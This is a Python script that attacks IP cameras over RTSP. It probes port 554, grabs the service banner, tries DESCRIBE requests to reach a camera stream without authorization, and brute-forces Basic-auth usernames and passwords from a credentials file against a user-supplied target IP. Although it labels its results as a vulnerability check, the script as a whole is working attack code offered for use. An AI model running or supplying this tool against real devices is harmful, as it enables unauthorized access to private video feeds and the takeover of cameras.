import socket
import subprocess
import base64

def is_rtsp_port_open(ip, port=554):
    try:
        with socket.create_connection((ip, port), timeout=3):
            print("RTSP port 554 is open and responding.")
            return True
    except Exception as e:
        print(f"RTSP port check failed: {str(e)}")
        return False

def get_rtsp_banner(ip, port=554):
    try:
        with socket.create_connection((ip, port), timeout=4) as sock:
            # Basic OPTIONS request for RTSP
            request = f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            sock.sendall(request.encode())
            response = sock.recv(2048).decode(errors='ignore')
            print("\nRTSP Banner / Response:")
            print("------------------------")
            print(response)
    except Exception as e:
        print(f"Failed to get RTSP banner: {str(e)}")

def try_unauthorized_rtsp_access(ip, port=554, path="/"):
    print("\nAttempting unauthorized access to camera stream...")
    try:
        request = f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 2\r\n\r\n"
        with socket.create_connection((ip, port), timeout=4) as sock:
            sock.sendall(request.encode())
            response = sock.recv(2048).decode(errors='ignore')

            if "200 OK" in response and "Content-Base" in response:
                print("[+] Unauthorized access granted to RTSP stream.")
                return True
            elif "401 Unauthorized" in response:
                print("[-] RTSP stream requires authentication.")
            else:
                print("[?] RTSP response did not match expected patterns.")
            print("Response:\n", response)
    except Exception as e:
        print(f"Unauthorized access attempt failed: {str(e)}")
    return False

def try_brute_force_rtsp(ip, port=554, path="/", credentials_file="credentials.json"):
    import json
    print("\nBrute-forcing RTSP credentials...")

    try:
        with open(credentials_file, "r") as file:
            credentials = json.load(file)
    except Exception as e:
        print("Error loading credentials file:", str(e))
        return False

    for entry in credentials:
        username = entry["username"]
        password = entry["password"]
        auth = base64.b64encode(f"{username}:{password}".encode()).decode()

        request = (
            f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
            f"CSeq: 3\r\n"
            f"Authorization: Basic {auth}\r\n\r\n"
        )

        try:
            with socket.create_connection((ip, port), timeout=4) as sock:
                sock.sendall(request.encode())
                response = sock.recv(2048).decode(errors='ignore')

                if "200 OK" in response:
                    print(f"[+] Access granted with credentials: {username} / {password}")
                    return True
        except Exception:
            continue

    print("[-] No valid RTSP credentials found.")
    return False

def check_rtsp_vulnerability(ip, port=554):
    if not is_rtsp_port_open(ip, port):
        print("Port is not open. Exiting...")
        return False

    get_rtsp_banner(ip, port)

    if try_unauthorized_rtsp_access(ip, port):
        print("RTSP is vulnerable to unauthorized access.")
        return True

    if try_brute_force_rtsp(ip, port):
        print("RTSP is vulnerable to weak authentication.")
        return True

    print("RTSP does not appear to be vulnerable.")
    return False

if __name__ == "__main__":
    target_ip = input("Enter target IP: ").strip()
    port_input = input("Enter port (default 554): ").strip()
    port = int(port_input) if port_input else 554

    check_rtsp_vulnerability(target_ip, port)
